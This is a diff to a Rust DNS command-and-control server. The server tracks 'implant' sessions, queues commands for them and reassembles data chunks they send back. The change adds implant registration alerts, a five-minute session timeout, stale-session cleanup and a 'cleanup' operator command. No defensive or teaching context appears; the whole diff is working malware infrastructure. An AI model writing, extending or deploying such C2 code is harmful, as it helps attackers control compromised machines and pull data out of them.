@@ -58,14 +58,16 @@ impl From<u16> for QType {
             _ => QType::Unknown(val),
         }
     }
+}
 
-    // fn to_u16(&self) -> u16 {
-    //     match self {
-    //         QType::A => 1,
-    //         QType::TXT => 16,
-    //         QType::Unknown(v) => *v,
-    //     }
-    // }
+impl QType {
+    fn to_u16(&self) -> u16 {
+        match self {
+            QType::A => 1,
+            QType::TXT => 16,
+            QType::Unknown(v) => *v,
+        }
+    }
 }
 
 // Parsed DNS Question
@@ -77,6 +79,8 @@ pub struct DnsQuestion {
 }
 
 // C2 Session Management
+const SESSION_TIMEOUT_SECS: u64 = 300; // 5 minutes
+
 pub struct ImplantSession {
     id: String,
     command_queue: Vec<String>,
@@ -96,14 +100,20 @@ impl C2State {
     }
 
     pub fn get_or_create_session(&mut self, implant_id: &str) -> &mut ImplantSession {
-        self.sessions
-            .entry(implant_id.to_string())
-            .or_insert(ImplantSession {
-                id: implant_id.to_string(),
-                command_queue: Vec::new(),
-                data_chunks: HashMap::new(),
-                last_seen: std::time::SystemTime::now(),
-            })
+        let is_new = !self.sessions.contains_key(implant_id);
+        let session = self.sessions.entry(implant_id.to_string()).or_insert(ImplantSession {
+            id: implant_id.to_string(),
+            command_queue: Vec::new(),
+            data_chunks: HashMap::new(),
+            last_seen: std::time::SystemTime::now(),
+        });
+            
+        if is_new {
+            println!("\n[!] NEW IMPLANT REGISTERED: {}", implant_id);
+            println!("{:=<70}", "");
+        }
+        
+        session
     }
 
     pub fn add_command(&mut self, implant_id: &str, command: &String) {
@@ -176,7 +186,43 @@ impl C2State {
                 .join("")
         })
     }
+    
+    pub fn cleanup_stale_sessions(&mut self) -> usize {
+        let timeout = Duration::from_secs(SESSION_TIMEOUT_SECS);
+        let now = SystemTime::now();
+        
+        let stale: Vec<String> = self.sessions
+            .iter()
+            .filter(|(_, session)| {
+                now.duration_since(session.last_seen)
+                    .map(|d| d > timeout)
+                    .unwrap_or(false)
+            })
+            .map(|(id, _)| id.clone())
+            .collect();
+        
+        let count = stale.len();
+        for id in stale {
+            println!("[!] Removing stale session: {} (timeout: {}s)", id, SESSION_TIMEOUT_SECS);
+            self.sessions.remove(&id);
+        }
+        
+        count
+    }
+
+    pub fn is_session_alive(&self, implant_id: &str) -> bool {
+        if let Some(session) = self.sessions.get(implant_id) {
+            let timeout = Duration::from_secs(SESSION_TIMEOUT_SECS);
+            SystemTime::now()
+                .duration_since(session.last_seen)
+                .map(|d| d <= timeout)
+                .unwrap_or(false)
+        } else {
+            false
+        }
+    }
 }
+
 
 // Parse DNS domain name from query (RFC 1035 Section 4.1.2)
 pub fn parse_domain_name(buf: &[u8], mut offset: usize) -> Result<(String, usize), &'static str> {
@@ -451,6 +497,11 @@ pub fn cli_loop(c2_state: Arc<Mutex<C2State>>) {
                 } else {
                     println!("No data found for implant: {}", implant_id);
                 }
+            }
+            "cleanup" => {
+                let mut state = c2_state.lock().unwrap();
+                let removed = state.cleanup_stale_sessions();
+                println!("Cleaned up {} stale session(s)", removed);
             }
             "help" => {
                 print_help();
